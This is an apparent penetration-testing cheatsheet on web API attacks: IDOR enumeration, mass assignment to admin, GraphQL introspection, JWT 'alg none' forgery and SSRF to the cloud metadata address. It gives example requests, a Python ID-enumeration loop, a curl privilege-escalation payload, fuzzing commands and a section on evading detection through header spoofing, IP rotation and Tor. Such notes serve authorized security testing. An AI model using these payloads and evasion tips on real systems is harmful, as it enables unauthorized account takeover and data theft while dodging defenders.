---
date: 
tags:
  - Cheatsheet
  - Technique
  - Web
---

```table-of-contents
```

# VULNERABILITY TYPES & EXPLOITATION

## IDOR (Insecure Direct Object Reference)

- Mechanism: Missing object-level authorization
- Test: Sequential/pattern ID manipulation
- Exploit:

```javascript
  GET /api/user/123 → 200 OK
  GET /api/user/456 → 200 OK (Unauthorized access)
```

- Tools: Burp Repeater, Python requests

## Mass Assignment

- Mechanism: Overprivileged object binding
- Test: Add privileged parameters (role, isAdmin)
- Exploit:

```javascript
  POST /api/users
  {"email":"user@test.com","role":"admin"}
```

- Tools: Postman, curl

## GraphQL Abuse

- Mechanism: Excessive data exposure
- Test: Introspection queries
- Exploit:

```javascript
 query {__schema{types{name,fields{name}}}
```

- Tools: GraphQLmap, Altair

## JWT Issues

- Mechanism: Weak crypto/validation
- Test: Algorithm substitution (none/HS256)
- Exploit:

```json
Header: {"alg":"none"}
  Payload: {"user":"admin"}
```

- Tools: jwt_tool, Burp JWT Editor

## SSRF via Webhooks

- Mechanism: Unrestricted URL fetching
- Test: Internal endpoint probing
- Exploit:

```javascript
POST /api/webhook
  {"url":"http://169.254.169.254"}
```

- Tools: Collaborator, Interactsh

# ENDPOINT DISCOVERY METHODS

- Directory fuzzing: ffuf -w wordlist.txt -u `https://target.com/api/FUZZ`
- JS analysis: Extract endpoints from `/static/main.js`
- Documentation: Check `/swagger.json`, `/openapi.yaml`
- Mobile apps: Use `MobSF for APK analysis`

# ESSENTIAL TOOLS

| Tool          | Primary Use                | Command Example                  |
|---------------|----------------------------|----------------------------------|
| Burp Suite    | Request manipulation       | Send to Repeater/Intruder        |
| ffuf          | Endpoint discovery         | ffuf -w api_words.txt -u URL/FUZZ|
| Postman       | API chain testing          | Environment variables            |
| GraphQLmap    | GraphQL exploitation       | dump schema, field suggestions   |
| jwt_tool      | JWT manipulation           | python3 jwt_tool.py <JWT> -T     |

# EXPLOIT CODE SNIPPETS

# IDOR Testing (Python)

```python
import requests
for id in range(1000,1002):
    r = requests.get(f'https://target.com/api/user/{id}', 
                    headers={'Authorization': 'Bearer TOKEN'})
    print(f"{id}: {len(r.text)} chars")
```

# Mass Assignment (curl)

```bash
curl -X POST 'https://target.com/api/users' \
-H 'Content-Type: application/json' \
-d '{"email":"attacker@evil.com","is_admin":true}'
```

# GraphQL Introspection

```graphql
query GetEverything {
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

# DEFENSE EVASION TECHNIQUES

- Request spacing: time.sleep(3) between calls
- Header rotation: Cycle User-Agent/X-Forwarded-For
- TLS fingerprinting: Mimic mobile app clients
- IP rotation: Proxy chains/Tor

# CRITICAL CHECKS

✓ Test all HTTP methods (GET/POST/PUT/PATCH/DELETE)
✓ Verify parameter pollution (param=1&param=2)
✓ Check .json/.xml alternatives (/api/users.json)
✓ Tamper with Content-Type headers

# Exploit Chain Example

1. Find /api/users/[ID] endpoint via fuzzing
2. Discover IDOR vulnerability
3. Extract admin ID via enumeration
4. Use mass assignment on /api/admin/profile
5. Achieve full compromise

# PRO TIPS

• Always test API versions (v1 vs v2 auth)
• Capture mobile app traffic with MITMproxy
• Chain IDOR + JWT issues for account takeover
• Check for debug endpoints (/api/test, /dev)
